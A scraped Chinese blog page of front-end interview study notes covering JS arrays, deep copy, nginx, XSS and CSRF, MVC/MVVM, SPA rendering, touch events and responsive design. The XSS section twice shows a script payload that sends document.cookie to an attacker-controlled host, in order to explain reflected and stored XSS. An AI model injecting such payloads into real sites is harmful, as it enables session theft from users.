<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>,empty,<span class="number">3</span>,<span class="number">4</span>] <span class="comment">//a</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>] <span class="comment">// b</span></span><br><span class="line"><span class="number">0</span>:<span class="number">1</span></span><br><span class="line"><span class="number">2</span>:<span class="number">3</span></span><br><span class="line"><span class="number">3</span>:<span class="number">4</span>    <span class="comment">//a</span></span><br><span class="line"><span class="number">0</span>:<span class="number">1</span></span><br><span class="line"><span class="number">1</span>:<span class="number">3</span></span><br><span class="line"><span class="number">2</span>:<span class="number">4</span>   <span class="comment">// b</span></span><br></pre></td></tr></table></figure>
<h4 id="11-其实深拷贝和浅拷贝都是针对的引用类型，JS中的变量类型分为值类型（基本类型）和引用类型；对值类型进行复制操作会对值进行一份拷贝，而对引用类型进行复制，则会进行地址的拷贝，最终两个变量指向同一份数据。深拷贝的话有可能导致爆栈（因为有用递归），破解方法：https-segmentfault-com-a-1190000016672263（md，现在真的看不懂，不开玩笑，还是看视频去了）"><a href="#11-其实深拷贝和浅拷贝都是针对的引用类型，JS中的变量类型分为值类型（基本类型）和引用类型；对值类型进行复制操作会对值进行一份拷贝，而对引用类型进行复制，则会进行地址的拷贝，最终两个变量指向同一份数据。深拷贝的话有可能导致爆栈（因为有用递归），破解方法：https-segmentfault-com-a-1190000016672263（md，现在真的看不懂，不开玩笑，还是看视频去了）" class="headerlink" title="11.其实深拷贝和浅拷贝都是针对的引用类型，JS中的变量类型分为值类型（基本类型）和引用类型；对值类型进行复制操作会对值进行一份拷贝，而对引用类型进行复制，则会进行地址的拷贝，最终两个变量指向同一份数据。深拷贝的话有可能导致爆栈（因为有用递归），破解方法：https://segmentfault.com/a/1190000016672263（md，现在真的看不懂，不开玩笑，还是看视频去了）"></a>11.其实深拷贝和浅拷贝都是针对的引用类型，JS中的变量类型分为值类型（基本类型）和引用类型；对值类型进行复制操作会对值进行一份拷贝，而对引用类型进行复制，则会进行地址的拷贝，最终两个变量指向同一份数据。深拷贝的话有可能导致爆栈（因为有用递归），破解方法：<a href="https://segmentfault.com/a/1190000016672263（md，现在真的看不懂，不开玩笑，还是看视频去了）" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016672263（md，现在真的看不懂，不开玩笑，还是看视频去了）</a></h4><h4 id="12-nginx"><a href="#12-nginx" class="headerlink" title="12.nginx:"></a>12.nginx:</h4><blockquote>
<p>1⃣️什么是反向代理？<br>当我们有一个服务器集群，并且服务器集群中的每台服务器的内容一样的时候，同样我们要直接从个人电脑访问到服务器集群服务器的时候无法访问，必须通过第三方服务器才能访问集群。<br>这个时候，我们通过第三方服务器访问服务器集群的内容，但是我们并不知道是哪一台服务器提供的内容，此种代理方式称为反向代理  </p>
</blockquote>
<blockquote>
<p>2⃣️什么是负载均衡<br>公司会建立很多的服务器，这些服务器组成了服务器集群，然后，当用户访问网站的时候，先访问一个中间服务器，再让这个中间服务器在服务器集群中选择一个压力较小的服务器，然后将该访问请求引入选择的服务器<br>所以，用户每次访问，都会保证服务器集群中的每个服务器压力趋于平衡，分担了服务器的压力，避免了服务器崩溃的情况。<br>一句话：nginx会给你分配服务器压力小的去访问  看看⬇️<br><a href="https://mp.weixin.qq.com/s/FRVE8u5NdAtbHJrvagdfcQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/FRVE8u5NdAtbHJrvagdfcQ</a>  </p>
</blockquote>
<h4 id="13-http状态码"><a href="#13-http状态码" class="headerlink" title="13.http状态码"></a>13.http状态码</h4><p><img src="../img/http.jpeg" alt="http状态码"></p>
<h4 id="14-vertical-align-”inline-block依赖性元素”，只有一个元素属于inline或者是inline-block-table-cell也可以理解为inline-block水平-水平，其身上的vertical-align属性才可以起作用。"><a href="#14-vertical-align-”inline-block依赖性元素”，只有一个元素属于inline或者是inline-block-table-cell也可以理解为inline-block水平-水平，其身上的vertical-align属性才可以起作用。" class="headerlink" title="14.vertical-align:”inline-block依赖性元素”，只有一个元素属于inline或者是inline-block(table-cell也可以理解为inline-block水平)水平，其身上的vertical-align属性才可以起作用。"></a>14.vertical-align:”inline-block依赖性元素”，只有一个元素属于inline或者是inline-block(table-cell也可以理解为inline-block水平)水平，其身上的vertical-align属性才可以起作用。</h4><h4 id="15-前端的安全性：XSS和CSRF"><a href="#15-前端的安全性：XSS和CSRF" class="headerlink" title="15.前端的安全性：XSS和CSRF"></a>15.前端的安全性：XSS和CSRF</h4><blockquote>
<p><code>XSS</code>又称CSS。。。。。。。，中文名叫跨站脚本攻击，XSS属于被动式且用于客户端的攻击方式。其原理：攻击者向有XSS漏洞的网站中输入（传入）恶意的HTML代码，当其他用户访问该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如：盗取用户的cookie、破坏页面结构、重定向到其他网站等。<code>XSS</code>攻击类似于SQL注入攻击，攻击前，先找到一个存在XSS漏洞的网站，XSS漏洞分为两种，一种是<code>DOM Based XSS</code>漏洞，另一种是<code>Stored XSS</code>漏洞。理论上，<b>所有可以输入的地方</b>没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限与script。  </p>
</blockquote>
<p>1.<b>DOM Based XSS</b>  </p>
<blockquote>
<p>这是一种基于网页DOM结构的攻击，该攻击的特点是中招的人是少数人。<b>比如:</b>我给A发一个邮件，邮件里面有一个超链接：<a href="http://www.a.com?content=" target="_blank" rel="noopener">http://www.a.com?content=</a><script>window.onload(‘<a href="http://www.b.com?param=+document.cookie&#39;">www.b.com?param=+document.cookie&#39;</a>)</script>(md禁了script的内容。。)，（假设知道a.com网站的内容是通过content参数直接显示的）当A点击这个链接（假设A已经登陆了a.com），浏览器会直接打开b.com，并且把A在a.com的cookie发给b.com，b.com是我自己搭的，当我的网站接收到该信息的时候，我就已经盗取了A在a.com的cookie了，攻击成功！这个过程中，受害者只有A自己。  </p>
</blockquote>
<p>2.<b>Stored XSS</b></p>
<blockquote>
<p>这是一个存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。<b>例如:</b>a.com可以发表文章，我登陆了a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.onload(‘<a href="http://www.b.com?param=+document.cookie&#39;">www.b.com?param=+document.cookie&#39;</a>)</script>，保存文章。这时候A和B看到了我发布的文章，当在查看我的文章的时候就都中招了，他们的cookie信息就发送到了我的服务器上，攻击成功。这个过程中，受害者是多人的。还有另一个例子就是，我登陆时候输入了恶意代码，代码被保存到后端数据库里面，然后超级管理员点击我的信息的时候也可以窃取到超级管理员的信息。<b>Stored XSS漏洞危害性更大，危害面更广。</b>  </p>
</blockquote>
<p>3.如何防御？<br>一句话：<b>永远不相信用户的输入，需要对用户的输入进行处理，只允许输入合法的值，其他值一概过滤掉。</b></p>
<h4 id="16-CSRF-跨站请求伪造-XSRF"><a href="#16-CSRF-跨站请求伪造-XSRF" class="headerlink" title="16.CSRF(跨站请求伪造/XSRF)"></a>16.CSRF(跨站请求伪造/XSRF)</h4><p><b>1</b>.  </p>
<blockquote>
<p>如何理解CSRF攻击？<font color="red">攻击者盗用了你的身份，以你的名义发送恶意请求</font><br>原理：<img src="../img/csrf.png" alt="csrf">从图可以看出，要完成一次csrf攻击，受害者必须<font color="red">依次完成两个步骤</font>：<br><b>1.登陆受信任网站A，并在本地生成Cookie<br>2.在不登出A点情况下，访问危险网站B。</b><br>你也许会说：“<b>如果我不满足以上两个条件的一个，我就不会受到CSRF的攻击</b>“,是的，确实如此，但你不能保证以下情况不会发生：<br>1.你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站.<br>2.你不能保证你关闭了浏览器后，你本地的cookie立即过期，你上次的会话已经结束。(事实上，关闭浏览器不能结束一个会话)<br>3.上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。  </p>
</blockquote>
<p><b><font color="red">CSRF攻击源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的</font></b><br><b>2.如何防御？</b>  </p>
<ol><br>  <li>CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行.</li><br>  <li>服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数</li><br></ol>  

<h4 id="17-TCP三次握手与四次挥手"><a href="#17-TCP三次握手与四次挥手" class="headerlink" title="17 TCP三次握手与四次挥手"></a>17 TCP三次握手与四次挥手</h4><p><img src="../img/TCP.JPG" alt="TCP">  </p>
<h4 id="18-Socket"><a href="#18-Socket" class="headerlink" title="18 Socket"></a>18 Socket</h4><p><img src="../img/socket.JPG" alt="socket"></p>
<h4 id="19-HTTP1-0与1-1的区别"><a href="#19-HTTP1-0与1-1的区别" class="headerlink" title="19 HTTP1.0与1.1的区别"></a>19 HTTP1.0与1.1的区别</h4><p><img src="../img/http1.x.jpg" alt="http1.x"></p>
<h4 id="20-HTTP1-x与2-0的区别"><a href="#20-HTTP1-x与2-0的区别" class="headerlink" title="20 HTTP1.x与2.0的区别"></a>20 HTTP1.x与2.0的区别</h4><p><img src="../img/http2.0.PNG" alt="http2.0"></p>
<h4 id="21-更多网络知识尽在："><a href="#21-更多网络知识尽在：" class="headerlink" title="21 更多网络知识尽在："></a>21 更多网络知识尽在：</h4><blockquote>
<p><a href="https://mp.weixin.qq.com/s/uF3bJrjGbGCAzCuCWk18BA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uF3bJrjGbGCAzCuCWk18BA</a>  </p>
</blockquote>
<h4 id="22-PWA-CGO面试有-："><a href="#22-PWA-CGO面试有-：" class="headerlink" title="22.PWA(CGO面试有)："></a>22.PWA(CGO面试有)：</h4><p>1.What is PWA?<br>:PWA全称渐进式网络应用，是一种可以提供类似于原生应用程序(native app)体验的网络应用程序(web app)。PWA 可以用来做很多事。其中最重要的是，在离线(offline)时应用程序能够继续运行功能。这是通过使用名为 Service Workers 的网络技术来实现的。  </p>
<h5 id="大致就上面那些，了解一下，更多的话看：https-blog-csdn-net-weixin-33716154-article-details-88177463"><a href="#大致就上面那些，了解一下，更多的话看：https-blog-csdn-net-weixin-33716154-article-details-88177463" class="headerlink" title="大致就上面那些，了解一下，更多的话看：https://blog.csdn.net/weixin_33716154/article/details/88177463"></a>大致就上面那些，了解一下，更多的话看：<a href="https://blog.csdn.net/weixin_33716154/article/details/88177463" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33716154/article/details/88177463</a></h5><h4 id="23-MVC由Model，View，Controller-Controller是MVC体系架构的核心部分-三部分组成。Controller中包含后台代码逻辑，View是ASPX，如纯HTML代码，Model是中间层。MVC的改变有两点，View变成简单的HTML，后台代码移到-NET类中，称为控制器-以下是ASP-NET-MVC请求流通用步骤-Model和Controller相连，View跟Controller相连"><a href="#23-MVC由Model，View，Controller-Controller是MVC体系架构的核心部分-三部分组成。Controller中包含后台代码逻辑，View是ASPX，如纯HTML代码，Model是中间层。MVC的改变有两点，View变成简单的HTML，后台代码移到-NET类中，称为控制器-以下是ASP-NET-MVC请求流通用步骤-Model和Controller相连，View跟Controller相连" class="headerlink" title="23.MVC由Model，View，Controller(Controller是MVC体系架构的核心部分)三部分组成。Controller中包含后台代码逻辑，View是ASPX，如纯HTML代码，Model是中间层。MVC的改变有两点，View变成简单的HTML，后台代码移到.NET类中，称为控制器.以下是ASP.NET MVC请求流通用步骤(Model和Controller相连，View跟Controller相连)"></a>23.MVC由Model，View，Controller<font color="red">(Controller是MVC体系架构的核心部分)</font>三部分组成。Controller中包含后台代码逻辑，View是ASPX，如纯HTML代码，Model是中间层。MVC的改变有两点，View变成简单的HTML，后台代码移到.NET类中，称为控制器.以下是<code>ASP.NET MVC</code>请求流通用步骤(Model和Controller相连，View跟Controller相连)</h4><p><b><br>  <ol><br>    <li>首先获取控制器<br>    </li><li>依赖行为控制器创建Model对象，Model通过转换调用数据访问层<br>    </li><li>数据填充Model层后，传递到View显示层，实现显示的目的。<br>  </li></ol><br></b></p>
<h5 id="看到MVC不得不提一下VUE中的的MVVM："><a href="#看到MVC不得不提一下VUE中的的MVVM：" class="headerlink" title="看到MVC不得不提一下VUE中的的MVVM："></a>看到MVC不得不提一下VUE中的的MVVM：</h5><ol><br>  <li>MVVM是什么？<br>  ：MVVM：M：Model，V：View，VM：ViewModel,类似于MVC的</li><br>  <ul><br>    <li>Model:代表数据模型，数据和业务逻辑都在Model层中定义；<br>    </li><li>View:代表UI视图，负责数据的展示；<br>    </li><li>ViewModel:负责监听Model层中的数据的改变并且控制视图的更新，处理用户的交互操作。<br>  </li></ul><br>  <li>Model和View并无直接关联，而是通过ViewModel来进行联系的，Model和ViewModel之间有着双向数据绑定的联系。因此，当Model中的数据中发生改变的时候会触发View层中的刷新，View中由于用户交互操作而改变的数据也会在Model中同步。<br>  </li><li>这种模式实现来Model和View的数据自动同步，因此开发者只需要专注对数据的维护即可，而不需要自己操作dom。<br><br>#### 24 XMLHttpRequest<br><img src="../img/readystate.png" alt="事件"><br><br>#### 25单页面应用(SPA)<br>&gt;只有一张Web页面的应用，是加载单个HTML页面并在用户与应用程序交互时动态更新该页面的Web应用程序，是指在浏览器中运行的应用，它们在使用期间不会重新加载页面。<br>&gt;速度：更好的用户体验，让用户在web app感受native app的速度和流畅，<br>MVC：经典MVC开发模式，前后端各负其责。<br>ajax：重前端，业务逻辑全部在本地操作，数据都需要通过AJAX同步、提交。<br>路由：在URL中采用#号来作为当前视图的地址,改变#号后的参数，页面并不会重载。<br>&gt;<b>单页Web应用，顾名思义，就是只有一张Web页面的应用。浏览器一开始会加载必需的HTML、CSS和JavaScript，之后所有的操作都在这张页面上完成，这一切都由JavaScript来控制。因此，单页Web应用会包含大量的JavaScript代码，复杂度可想而知，模块化开发和设计的重要性不言而喻。</b><br><br>#### 26网页渲染模式—服务端渲染和客户端渲染<br><ol><br>  <li>服务端渲染(后端渲染<b>SSR</b>):后端渲染HTML的情况下，浏览器就是直接呈现出经服务器计算处理的HTML代码，这里的计算处理就是服务器经过解析存在服务器端的模板文件来完成的。在这种情况下，浏览器只进行了HTML的解析，以及通过操作系统提供的操纵显示器显示内容的系统调用在显示器上把HTML所代表的图像显示给用户。<br><br>&gt;<b>好处:前端耗时少(因为前端只负责将HTML进行展示)，利于SEO<br>&gt;坏处:网络传输量大，占用(部分、少部分)服务器运算资源，response出的数据会大些，模板改了前端的交互和样式之类的东西也要跟着联动修改</b><br>  </li><li>客户端渲染(前端渲染CSR)——SPA—单页面应用:前端渲染就是指浏览器会从后端得到一些信息，将这些信息组织排列形成最终可读的HTML字符串是由浏览器来完成的，在形成了HTML字符串之后，再进行显示。<br><br>&gt;<b>好处：网络传输数据量小（减少了服务器压力）<br>&gt;坏处：前端耗时较多，不利于SEO</b><br>  </li><li>解决seo的方案一般有三种<br>    <ol><br>      <li>页面预渲染<br>      </li><li>服务端渲染<br>      </li><li>路由采用H5 History<br>    </li></ol><br>  </li><li>技术上常用的有四个<br>    <ol><br>      <li>ssr: <code>https://cn.vuejs.org/v2/guide/ssr.html</code><br>      </li><li>vue-meta-info: <code>https://zhuanlan.zhihu.com/p/29148760</code><br>      </li><li>nuxt(简单易用):<a href="https://zh.nuxtjs.org/guide/installation" target="_blank" rel="noopener">https://zh.nuxtjs.org/guide/installation</a><br>      </li><li>phantomjs页面预渲染 phantomjs.org<br>    </li></ol><br></li></ol>

<h4 id="27-关于koa的知识可以看视频的源代码和课件"><a href="#27-关于koa的知识可以看视频的源代码和课件" class="headerlink" title="27.关于koa的知识可以看视频的源代码和课件"></a>27.关于koa的知识可以看视频的源代码和课件</h4><h4 id="28-函数重载："><a href="#28-函数重载：" class="headerlink" title="28.函数重载："></a>28.函数重载：</h4><blockquote>
<h5 id="ECMAScript函数参数在内部是用一个数组来表示的，函数接收到的始终都是这个数组，而不关心这个数组中包含哪些参数。实际上，在函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给函数的每一个参数。函数的一个重要特点：命名的参数只是提供来便利，但不是必需的。arguments的值永远与对应命名参数的值保持同步，但是它们两个之间的内存空间是相互独立的，只不过值同步而已。另外，假如函数只传入了一个参数，那么arguments-1-设置的值不会反映到命名参数中，因为arguments对象的长度是由传入的参数个数决定的，不是由定义函数时的命名参数的个数决定的。"><a href="#ECMAScript函数参数在内部是用一个数组来表示的，函数接收到的始终都是这个数组，而不关心这个数组中包含哪些参数。实际上，在函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给函数的每一个参数。函数的一个重要特点：命名的参数只是提供来便利，但不是必需的。arguments的值永远与对应命名参数的值保持同步，但是它们两个之间的内存空间是相互独立的，只不过值同步而已。另外，假如函数只传入了一个参数，那么arguments-1-设置的值不会反映到命名参数中，因为arguments对象的长度是由传入的参数个数决定的，不是由定义函数时的命名参数的个数决定的。" class="headerlink" title="ECMAScript函数参数在内部是用一个数组来表示的，函数接收到的始终都是这个数组，而不关心这个数组中包含哪些参数。实际上，在函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给函数的每一个参数。函数的一个重要特点：命名的参数只是提供来便利，但不是必需的。arguments的值永远与对应命名参数的值保持同步，但是它们两个之间的内存空间是相互独立的，只不过值同步而已。另外，假如函数只传入了一个参数，那么arguments[1]设置的值不会反映到命名参数中，因为arguments对象的长度是由传入的参数个数决定的，不是由定义函数时的命名参数的个数决定的。"></a>ECMAScript函数参数在内部是用一个数组来表示的，函数接收到的始终都是这个数组，而不关心这个数组中包含哪些参数。实际上，在函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给函数的每一个参数。函数的一个重要特点：命名的参数只是提供来便利，但不是必需的。arguments的值永远与对应命名参数的值保持同步，但是它们两个之间的内存空间是相互独立的，只不过值同步而已。另外，假如函数只传入了一个参数，那么arguments[1]设置的值不会反映到命名参数中，因为arguments对象的长度是由传入的参数个数决定的，不是由定义函数时的命名参数的个数决定的。</h5></blockquote>
<blockquote>
<h5 id="ECMAScript函数不能像传统意义上那样实现重载。如果定义了两个名字相同的函数，该名字只属于后定义的函数。不过，通过检查传入函数中参数的类型和数量并作出不同的反应，可以模仿方法的重载。《高程第三版》66页"><a href="#ECMAScript函数不能像传统意义上那样实现重载。如果定义了两个名字相同的函数，该名字只属于后定义的函数。不过，通过检查传入函数中参数的类型和数量并作出不同的反应，可以模仿方法的重载。《高程第三版》66页" class="headerlink" title="ECMAScript函数不能像传统意义上那样实现重载。如果定义了两个名字相同的函数，该名字只属于后定义的函数。不过，通过检查传入函数中参数的类型和数量并作出不同的反应，可以模仿方法的重载。《高程第三版》66页"></a>ECMAScript函数不能像传统意义上那样实现重载。如果定义了两个名字相同的函数，该名字只属于后定义的函数。<font color="red">不过，通过检查传入函数中参数的类型和数量并作出不同的反应，可以模仿方法的重载。《高程第三版》66页</font></h5></blockquote>
</li></ol>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/22/坚持打卡第一天/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/22/坚持打卡第一天/" itemprop="url">坚持打卡第一天</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-22T11:54:29+08:00">
                2019-01-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="好像好久没有写过博客了，嗯，是的。"><a href="#好像好久没有写过博客了，嗯，是的。" class="headerlink" title="好像好久没有写过博客了，嗯，是的。"></a>好像好久没有写过博客了，嗯，是的。</h4><h4 id="最近看了一篇文章就是说Touch滑动，所谓Touch滑动就是类似于PC端的滚动事件，可是移动端没有滚动事件，所以就需要Touch事件结合js去实现。（原文：https-segmentfault-com-a-1190000017852497）"><a href="#最近看了一篇文章就是说Touch滑动，所谓Touch滑动就是类似于PC端的滚动事件，可是移动端没有滚动事件，所以就需要Touch事件结合js去实现。（原文：https-segmentfault-com-a-1190000017852497）" class="headerlink" title="最近看了一篇文章就是说Touch滑动，所谓Touch滑动就是类似于PC端的滚动事件，可是移动端没有滚动事件，所以就需要Touch事件结合js去实现。（原文：https://segmentfault.com/a/1190000017852497）"></a>最近看了一篇文章就是说Touch滑动，所谓Touch滑动就是类似于PC端的滚动事件，可是移动端没有滚动事件，所以就需要Touch事件结合js去实现。（原文：<a href="https://segmentfault.com/a/1190000017852497）" target="_blank" rel="noopener">https://segmentfault.com/a/1190000017852497）</a></h4><ol>
<li><code>Touch事件</code>在移动端细分为三种：<code>touchstart</code>：当手指触碰到屏幕的时候触发，<code>touchmove</code>：当手指在屏幕上不断移动的时候才触发，<code>touchend</code>当手指离开屏幕的时候触发，<code>touch</code>事件必须用<code>addEventListener</code>去监听<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 手指触碰到屏幕时触发</span></span><br><span class="line">element.addEventListener(<span class="string">'touchstart'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line"><span class="comment">// 打印的事件对象</span></span><br><span class="line"><span class="built_in">console</span>.log(e)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>打印出来的对象里面有3个伪数组（对象）：<code>changedTouches</code>、<code>targetTouches</code>、<code>touches</code>，里面装的是手指列表，包含用户触摸事件时的手指信息，之所以是伪数组，是因为有可能出现多指同时触摸，但在实际工作中一般不去考虑。但是这三个是有区别的，在<code>touchstart</code>和<code>touchmove</code>事件的时候三个伪数组都能获取到手指信息，可是<code>touchend</code>事件到时候，只有<code>changedTouches</code>才能返回离开屏幕时的手指信息。<br>2.console对象信息出来的时候发现里面的值是跟viewport有关的，然后我一直都不是很了解viewport是啥，然后去百度了一下：</p>
<blockquote>
<p><code>viewport</code>其实是一个视觉窗口，在这个窗口中我们可以拖动横向竖向滑动条或者放大缩小网页，来达到最佳的浏览效果（类似于桌面浏览器）使用viewport需要对其进行设置，其加在<code>meta</code>标签中：<code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0,user-scalable=no&quot;/&gt;</code>这是一条最常见的viewport meta代码，将viewport定义为：宽度为设备宽度，初始缩放比例为一倍，禁止用户缩放。<br><br><code>viewport</code>属性&amp;值如下：<br>width：viewport宽度<br>height：viewport高度<br>initial-scale：初始缩放比例<br>maximum-scale：最大缩放比例<br>minimum-scale：最小缩放比例<br>user-scalable：是否允许用户缩放（yes/no）<br>3.设计到viewport就好像跟html响应式布局有关联了：<br>第一步：在网页代码到头部，加入一行viewport元标签<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1.0, maximum-scale=1.0"</span> /&gt;</span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string">&gt;第二步：流动布局  </span></span><br><span class="line"><span class="string">页面中各个区块的位置都是浮动的，不是固定不变的，如果宽度太小，放不下两个元素，后面的元素会自动滚动到前面元素的下方，不会在水平方向overflow，避免了水平滚动条的出现  </span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line">.left&#123; <span class="attr">width</span>:<span class="number">30</span>%; float:left&#125;</span><br><span class="line">.right&#123; <span class="attr">width</span>:<span class="number">70</span>%; float:right;&#125;</span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string">&gt;第三步：CSS的@media规则，选择性加载CSS  </span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line">@media screeh and (max-device-width:<span class="number">400</span>px) &#123; .left&#123;<span class="attr">float</span>:none;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>当屏幕小于400时，left取消了浮动<br>&nbsp;&nbsp;”自适应网页”设计的核心，就是CSS3引入的Media Query模块。自动探测屏幕宽度，然后加载相应的CSS文件：<br><code>`</code>javascript</p>
</blockquote>
<p><link rel="stylesheet" type="text/css" media="screen and (max-device-width: 600px)" href="style/css/css600.css"></p>
<p><link rel="stylesheet" type="text/css" media="screen and (min-width: 600px) and (max-device-width: 980px)" href="css600-980.css"></p>
<pre><code>&gt;上面例子1就是如果屏幕宽度小于600像素（max-device-width：600px），就加载css600.css文件；例子2就是当屏幕宽度在600像素到980像素之间，则加载css600-980.css文件  

&gt;第四步：不使用绝对宽度，字体大小  
（1）width：auto；/width：xx%；
（2）字体大小是页面默认大小的100%，即16px；字体不要使用绝对大小&quot;px&quot;，要使用相对大小&quot;REM&quot;  
```javascript
html{font-size:62.5%;} body {font:normal 100% Arial,sans-serif;font-size:14px; font-size:1.4rem; }
</code></pre><blockquote>
<p>第五步：图片的自适应<br>“自适应网页设计”还必须实现图片的自动缩放。  </p>
<pre><code class="javascript">img, object {max-width:<span class="number">100</span>%;}
</code></pre>
<p>老版本IE不支持max-width,所以只好写成  </p>
<pre><code class="javascript">img{<span class="attr">width</span>:<span class="number">100</span>%}
</code></pre>
</blockquote>
<h4 id="关于vh-vw-vmin-vmax的可以看这篇文章，的确是篇好文：https-blog-csdn-net-ZNYSYS520-article-details-76053961"><a href="#关于vh-vw-vmin-vmax的可以看这篇文章，的确是篇好文：https-blog-csdn-net-ZNYSYS520-article-details-76053961" class="headerlink" title="关于vh vw vmin vmax的可以看这篇文章，的确是篇好文：https://blog.csdn.net/ZNYSYS520/article/details/76053961"></a>关于vh vw vmin vmax的可以看这篇文章，的确是篇好文：<a href="https://blog.csdn.net/ZNYSYS520/article/details/76053961" target="_blank" rel="noopener">https://blog.csdn.net/ZNYSYS520/article/details/76053961</a></h4>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/08/HTTP常考题/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/08/HTTP常考题/" itemprop="url">HTTP常考题</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-08T17:26:09+08:00">
                2018-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="好了，看了点考试题，不知道面试时会不会用到，反正先记一下吧。"><a href="#好了，看了点考试题，不知道面试时会不会用到，反正先记一下吧。" class="headerlink" title="好了，看了点考试题，不知道面试时会不会用到，反正先记一下吧。"></a>好了，看了点考试题，不知道面试时会不会用到，反正先记一下吧。</h4><h3 id="1-如何理解HTTP协议是无状态的【常考】"><a href="#1-如何理解HTTP协议是无状态的【常考】" class="headerlink" title="1.如何理解HTTP协议是无状态的【常考】"></a>1.如何理解HTTP协议是无状态的【常考】</h3><blockquote>
<p>HTTP协议是无状态的，指的是协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。也就是说，打开一个服务器上的网页和上一次打开这个服务器上的网页之间没有任何联系。HTTP是一个无状态的面向连接的协议，无状态不代表HTTP不能保持TCP连接，更不能代表HTTP使用的UDP协议（无连接）。  </p>
</blockquote>
<h3 id="2-127-0-0-1与192-168-0-1有什么区别【可能考】"><a href="#2-127-0-0-1与192-168-0-1有什么区别【可能考】" class="headerlink" title="2.127.0.0.1与192.168.0.1有什么区别【可能考】"></a>2.127.0.0.1与192.168.0.1有什么区别【可能考】</h3><blockquote>
